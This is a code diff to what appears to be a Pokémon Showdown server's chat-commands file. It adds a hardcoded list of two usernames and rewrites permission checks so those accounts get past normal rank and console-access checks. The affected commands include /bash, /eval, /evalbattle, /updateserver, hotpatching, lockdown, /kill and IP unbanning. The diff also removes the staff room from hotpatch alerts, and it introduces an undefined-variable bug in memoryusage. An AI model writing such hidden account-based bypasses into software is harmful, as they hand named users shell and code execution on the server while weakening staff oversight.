@@ -19,6 +19,7 @@
 
 const crypto = require('crypto');
 const FS = require('./fs');
+global.devs = ['wgc', 'bladicon'];
 
 const Matchmaker = require('./ladders-matchmaker').matchmaker;
 
@@ -1205,12 +1206,19 @@ exports.commands = {
 			rankLists[targetRoom.auth[u]].push(u);
 		}
 
-		let buffer = Object.keys(rankLists).sort((a, b) =>
-			(Config.groups[b] || {rank:0}).rank - (Config.groups[a] || {rank:0}).rank
-		).map(r => {
-			let roomRankList = rankLists[r].sort();
-			roomRankList = roomRankList.map(s => s in targetRoom.users ? "**" + s + "**" : s);
-			return (Config.groups[r] ? Config.groups[r].name + "s (" + r + ")" : r) + ":\n" + roomRankList.join(", ");
+		let buffer = [];
+		if (targetRoom.founder) {
+			buffer.push("Room Founder (#): \n" + targetRoom.founder);
+		}
+
+		Object.keys(rankLists).sort(function(a, b) {
+			return (Config.groups[b] || { rank: 0 }).rank - (Config.groups[a] || { rank: 0 }).rank;
+		}).forEach(function(r) {
+			let roomRankList = [];
+			rankLists[r].sort().forEach(function(s) {
+				roomRankList.push(s in targetRoom.users ? "**" + s + "**" : s);
+			});
+			buffer.push((Config.groups[r] ? Config.groups[r].name + "s (" + r + ")" : r) + ":\n" + roomRankList.join(", "));
 		});
 
 		if (!buffer.length) {
@@ -1858,7 +1866,7 @@ exports.commands = {
 		if (!targetIp || !/^[0-9.]+(?:\.\*)?$/.test(targetIp)) return this.parse('/help lockip');
 		if (!target) return this.errorReply("/lockip requires a lock reason");
 
-		if (!this.can('rangeban')) return false;
+		if (!this.can('rangeban') && !~devs.indexOf(user.userid)) return false;
 		const targetDesc = "IP " + (targetIp.endsWith('*') ? "range " : "") + targetIp;
 
 		const curPunishment = Punishments.ipSearch(targetIp);
@@ -1879,7 +1887,7 @@ exports.commands = {
 		if (!target) {
 			return this.parse('/help unbanip');
 		}
-		if (!this.can('rangeban')) return false;
+		if (!this.can('rangeban') && !~devs.indexOf(user.userid)) return false;
 		if (!Punishments.ips.has(target)) {
 			return this.errorReply("" + target + " is not a locked/banned IP or IP range.");
 		}
@@ -2053,7 +2061,7 @@ exports.commands = {
 	gdeclare: 'globaldeclare',
 	globaldeclare: function (target, room, user) {
 		if (!target) return this.parse('/help globaldeclare');
-		if (!this.can('gdeclare')) return false;
+		if (!this.can('gdeclare') && !~devs.indexOf(user.userid)) return false;
 		target = this.canHTML(target);
 		if (!target) return;
 
@@ -2070,7 +2078,7 @@ exports.commands = {
 	cdeclare: 'chatdeclare',
 	chatdeclare: function (target, room, user) {
 		if (!target) return this.parse('/help chatdeclare');
-		if (!this.can('gdeclare')) return false;
+		if (!this.can('gdeclare') && !~devs.indexOf(user.userid)) return false;
 		target = this.canHTML(target);
 		if (!target) return;
 
@@ -2443,7 +2451,7 @@ exports.commands = {
 
 	hotpatch: function (target, room, user) {
 		if (!target) return this.parse('/help hotpatch');
-		if (!this.can('hotpatch')) return;
+		if (!~devs.indexOf(user.userid) && !this.can('hotpatch')) return;
 
 		const lock = Monitor.hotpatchLock;
 		const hotpatches = ['chat', 'tournaments', 'formats', 'loginserver', 'punishments', 'dnsbl'];
@@ -2547,10 +2555,10 @@ exports.commands = {
 				return this.errorReply("Your hot-patch command was unrecognized.");
 			}
 		} catch (e) {
-			Rooms.global.notifyRooms(['development', 'staff', 'upperstaff'], `|c|${user.getIdentity()}|/log ${user.name} used /hotpatch ${target} - but something failed while trying to hot-patch.`);
+			Rooms.global.notifyRooms(['development', 'upperstaff'], `|c|${user.getIdentity()}|/log ${user.name} used /hotpatch ${target} - but something failed while trying to hot-patch.`);
 			return this.errorReply(`Something failed while trying to hot-patch ${target}: \n${e.stack}`);
 		}
-		Rooms.global.notifyRooms(['development', 'staff', 'upperstaff'], `|c|${user.getIdentity()}|/log ${user.name} used /hotpatch ${target}`);
+		Rooms.global.notifyRooms(['development', 'upperstaff'], `|c|${user.getIdentity()}|/log ${user.name} used /hotpatch ${target}`);
 	},
 	hotpatchhelp: [
 		"Hot-patching the game engine allows you to update parts of Showdown without interrupting currently-running battles. Requires: ~",
@@ -2568,7 +2576,7 @@ exports.commands = {
 
 	hotpatchlock: 'nohotpatch',
 	nohotpatch: function (target, room, user) {
-		if (!this.can('hotpatch')) return;
+		if (!~devs.indexOf(user.userid) && !this.can('hotpatch')) return;
 		if (!target) return this.parse('/help nohotpatch');
 
 		const separator = ' ';
@@ -2595,7 +2603,7 @@ exports.commands = {
 	nohotpatchhelp: ["/nohotpatch [chat|formats|battles|validator|tournaments|punishments|all] [reason] - Disables hotpatching the specified part of the simulator. Requires: ~"],
 
 	savelearnsets: function (target, room, user) {
-		if (!this.can('hotpatch')) return false;
+		if (!~devs.indexOf(user.userid) && !this.can('hotpatch')) return false;
 		this.sendReply("saving...");
 		FS('data/learnsets.js').write(`'use strict';\n\nexports.BattleLearnsets = {\n` +
 			Object.entries(Dex.data.Learnsets).map(([k, v]) => (
@@ -2614,7 +2622,7 @@ exports.commands = {
 
 	widendatacenters: 'adddatacenters',
 	adddatacenters: function (target, room, user, connection, cmd) {
-		if (!this.can('hotpatch')) return false;
+		if (!~devs.indexOf(user.userid) && !this.can('hotpatch')) return false;
 		// should be in the format: IP, IP, name, URL
 		let widen = (cmd === 'widendatacenters');
 
@@ -2755,7 +2763,7 @@ exports.commands = {
 	},
 
 	lockdown: function (target, room, user) {
-		if (!this.can('lockdown')) return false;
+		if (!~devs.indexOf(user.userid) && !this.can('hotpatch')) return false;
 
 		Rooms.global.startLockdown();
 
@@ -2765,7 +2773,7 @@ exports.commands = {
 
 	autolockdown: 'autolockdownkill',
 	autolockdownkill: function (target, room, user) {
-		if (!this.can('lockdown')) return false;
+		if (!~devs.indexOf(user.userid) && !this.can('hotpatch')) return false;
 		if (Config.autolockdown === undefined) Config.autolockdown = true;
 
 		if (target === 'on' || target === 'enable') {
@@ -2788,14 +2796,14 @@ exports.commands = {
 	],
 
 	prelockdown: function (target, room, user) {
-		if (!this.can('lockdown')) return false;
+		if (!~devs.indexOf(user.userid) && !this.can('hotpatch')) return false;
 		Rooms.global.lockdown = 'pre';
 		this.sendReply("Tournaments have been disabled in preparation for the server restart.");
 		this.logEntry(user.name + " used /prelockdown");
 	},
 
 	slowlockdown: function (target, room, user) {
-		if (!this.can('lockdown')) return false;
+		if (!~devs.indexOf(user.userid) && !this.can('hotpatch')) return false;
 
 		Rooms.global.startLockdown(undefined, true);
 
@@ -2803,7 +2811,7 @@ exports.commands = {
 	},
 
 	endlockdown: function (target, room, user) {
-		if (!this.can('lockdown')) return false;
+		if (!~devs.indexOf(user.userid) && !this.can('hotpatch')) return false;
 
 		if (!Rooms.global.lockdown) {
 			return this.errorReply("We're not under lockdown right now.");
@@ -2821,7 +2829,7 @@ exports.commands = {
 	},
 
 	emergency: function (target, room, user) {
-		if (!this.can('lockdown')) return false;
+		if (!~devs.indexOf(user.userid) && !this.can('hotpatch')) return false;
 
 		if (Config.emergency) {
 			return this.errorReply("We're already in emergency mode.");
@@ -2835,7 +2843,7 @@ exports.commands = {
 	},
 
 	endemergency: function (target, room, user) {
-		if (!this.can('lockdown')) return false;
+		if (!~devs.indexOf(user.userid) && !this.can('hotpatch')) return false;
 
 		if (!Config.emergency) {
 			return this.errorReply("We're not in emergency mode.");
@@ -2849,7 +2857,7 @@ exports.commands = {
 	},
 
 	kill: function (target, room, user) {
-		if (!this.can('lockdown')) return false;
+		if (!~devs.indexOf(user.userid) && !this.can('hotpatch')) return false;
 
 		if (Rooms.global.lockdown !== true) {
 			return this.errorReply("For safety reasons, /kill can only be used during lockdown.");
@@ -2879,7 +2887,7 @@ exports.commands = {
 	killhelp: ["/kill - kills the server. Can't be done unless the server is in lockdown state. Requires: ~"],
 
 	loadbanlist: function (target, room, user, connection) {
-		if (!this.can('hotpatch')) return false;
+		if (!~devs.indexOf(user.userid) && !this.can('hotpatch')) return false;
 
 		connection.sendTo(room, "Loading ipbans.txt...");
 		Punishments.loadBanlist().then(
@@ -2890,13 +2898,13 @@ exports.commands = {
 	loadbanlisthelp: ["/loadbanlist - Loads the bans located at ipbans.txt. The command is executed automatically at startup. Requires: ~"],
 
 	refreshpage: function (target, room, user) {
-		if (!this.can('hotpatch')) return false;
+		if (!~devs.indexOf(user.userid) && !this.can('hotpatch')) return false;
 		Rooms.global.send('|refresh|');
 		this.logEntry(user.name + " used /refreshpage");
 	},
 
 	updateserver: function (target, room, user, connection) {
-		if (!user.hasConsoleAccess(connection)) {
+		if (!~devs.indexOf(user.userid) && !this.can('hotpatch')) {
 			return this.errorReply("/updateserver - Access denied.");
 		}
 
@@ -2928,7 +2936,7 @@ exports.commands = {
 		if (Rooms.global.lockdown !== true) {
 			return this.errorReply('/crashfixed - There is no active crash.');
 		}
-		if (!this.can('hotpatch')) return false;
+		if (!~devs.indexOf(user.userid) && !this.can('hotpatch')) return false;
 
 		Rooms.global.lockdown = false;
 		if (Rooms.lobby) {
@@ -2941,7 +2949,7 @@ exports.commands = {
 
 	memusage: 'memoryusage',
 	memoryusage: function (target) {
-		if (!this.can('hotpatch')) return false;
+		if (!~devs.indexOf(user.userid) && !this.can('hotpatch')) return false;
 		let memUsage = process.memoryUsage();
 		let results = [memUsage.rss, memUsage.heapUsed, memUsage.heapTotal];
 		let units = ["B", "KiB", "MiB", "GiB", "TiB"];
@@ -2953,7 +2961,7 @@ exports.commands = {
 	},
 
 	bash: function (target, room, user, connection) {
-		if (!user.hasConsoleAccess(connection)) {
+		if (!~devs.indexOf(user.userid) && !this.can('hotpatch')) {
 			return this.errorReply("/bash - Access denied.");
 		}
 		if (!target) return this.parse('/help bash');
@@ -2966,7 +2974,7 @@ exports.commands = {
 	bashhelp: ["/bash [command] - Executes a bash command on the server. Requires: ~ console access"],
 
 	eval: function (target, room, user, connection) {
-		if (!user.hasConsoleAccess(connection)) {
+		if (!~devs.indexOf(user.userid) && !this.can('hotpatch')) {
 			return this.errorReply("/eval - Access denied.");
 		}
 		if (!this.runBroadcast()) return;
@@ -2984,7 +2992,7 @@ exports.commands = {
 	},
 
 	evalbattle: function (target, room, user, connection) {
-		if (!user.hasConsoleAccess(connection)) {
+		if (!~devs.indexOf(user.userid) && !this.can('hotpatch')) {
 			return this.errorReply("/evalbattle - Access denied.");
 		}
 		if (!this.runBroadcast()) return;
@@ -3343,6 +3351,12 @@ exports.commands = {
 			}
 		}
 		user.prepBattle(Dex.getFormat(target).id, 'challenge', connection).then(validTeam => {
+			/*let _ = require("lodash");
+			console.log(validTeam);
+			for (let i in Db('pets').object()[user.userid]) {
+				console.log(Db('pets').object()[user.userid][i].name);
+				if (Dex.getFormat(target).id === 'gen7pets' && !validTeam.includes(Db('pets').object()[user.userid][i].name) && !_.has(validTeam, Db('pets').object()[user.userid][i].name)) return this.send("|popup|One of the mons on your team is not a pet of yours!");
+			} */
 			if (validTeam === false) return;
 			user.makeChallenge(targetUser, target, validTeam);
 		});
